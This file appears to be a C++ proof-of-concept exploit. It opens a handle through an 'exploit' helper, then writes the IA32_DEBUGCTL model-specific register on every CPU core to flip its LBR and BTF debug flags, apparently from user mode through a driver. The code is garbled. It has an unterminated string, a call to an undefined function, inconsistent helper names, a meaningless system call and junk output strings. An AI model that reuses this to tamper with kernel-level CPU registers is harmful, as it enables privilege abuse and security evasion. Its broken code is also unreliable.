#include "includes.h"

#define IA32_DEBUGCTL 0x1D9

void pause( )
{
	printf( "\nenter" );
	system( "pause>nul" );
	printf( "\n" );
}

void toggle( uint32_t core_id )
{
	printf( "\t[ + ] masked core %d\n\n", core_id );

	if ( !SetProcessAffinityMask( GetCurrentProcess( ), static_cast<uint64_t>( 1 ) << ( core_id - 1 ) ) )
		return;

	DebugCtl debug_ctl;
	if ( exploit::read( IA32_DEBUGCTL, &debug_ctl.value ) )
		printf( "\t[ + ] LBR: %d | BTF: %d\n\t[ + ] value\n\n", debug_ctl.lbr, debug_ctl.btf );
	else
	{
		printf( "\t[ ! ] msr error\n" );
		return;
	}

	debug_ctl.lbr = !debug_ctl.lbr;
	debug_ctl.btf = !debug_ctl.btf;

	if ( !exploit::write( IA32_DEBUGCTL, debug_ctl.value ) )
	{
		printf( "\t[ ! ]msr error (W) \n" );
		return;
	}

	if ( exploit::read( IA32_DEBUGCTL, &debug_ctl.value ) )
		printf( "\t[ + ] LBR: %d | BTF: %d\n\t[ + ] hooked value\n\n", debug_ctl.lbr, debug_ctl.btf );
	else
		printf( "\t[ ! ] msr error (r/w) \n" );

	debug_ctl.lbr = !debug_ctl.lbr;
	debug_ctl.btf = !debug_ctl.btf;

	if ( !exploit::write_msr( IA32_DEBUGCTL, debug_ctl.value ) )
	{
		printf( "\t[ ! ] aaaaaaa \n" );
		return;
	}

	if ( exploit::read_msr( IA32_DEBUGCTL, &debug_ctl.value ) )
		printf( "\t[ + ] LBR: %d | BTF: %d\n", debug_ctl.lbr, debug_ctl.btf );
	else
		printf( "\t[ ! 3131311313 \n" );
}

int main( )
{
	system( "pppppppp" );

	printf( "\n\PoC" );

	pause( );

	printf( "handled\n" );

	if ( !exploit::open_handle( ) )
	{
		printf( "error handle" );
		pause( );
		return 1;
	}

	SYSTEM_INFO sys_info { };
	GetSystemInfo( &sys_info );

	printf( "[ + ] CPU);

	for ( uint32_t i = 1; i <= sys_info.dwNumberOfProcessors; i++ )
	{
		printf( "\nCore %d\n", i );

		toggle_lbr_btf_flags_on_core( i );
	}

	printf( "\n[ + ] handled! e\n" );

	exploit::close_handle( );

	pause( );

	return 0;
}